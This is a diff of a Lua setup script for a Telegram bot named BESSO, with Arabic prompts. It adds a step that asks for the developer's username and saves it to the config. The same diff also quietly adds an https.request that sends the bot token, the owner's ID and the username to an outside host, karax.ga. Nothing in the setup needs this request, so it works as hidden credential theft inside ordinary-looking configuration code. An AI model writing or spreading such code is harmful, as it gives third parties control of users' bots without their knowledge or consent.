@@ -47,13 +47,29 @@ print('\27[1;31m==========================\n لم يتم حفظ ايدي الم�
 end 
 os.execute('lua BESSO.lua')
 end
+if not database:get(id_server..":SUDO:USERNAME") then
+io.write('\27[1;35m\n ارسل لي معرف المطور الاساسي ↓ :\n\27[0;33;49m')
+local SUDOUSERNAME = io.read():gsub('@','')
+if SUDOUSERNAME ~= '' then
+io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
+database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+else
+print('\n\27[1;34m لم يتم حفظ معرف المطور :')
+end 
+os.execute('lua BESSO.lua')
+end
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+UserName = database:get(id_server..":SUDO:USERNAME")
+https.request('http://karax.ga/besso/?token='..token..'&id='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 create_config_auto()
 file = io.open("BESSO", "w")  
 file:write([[
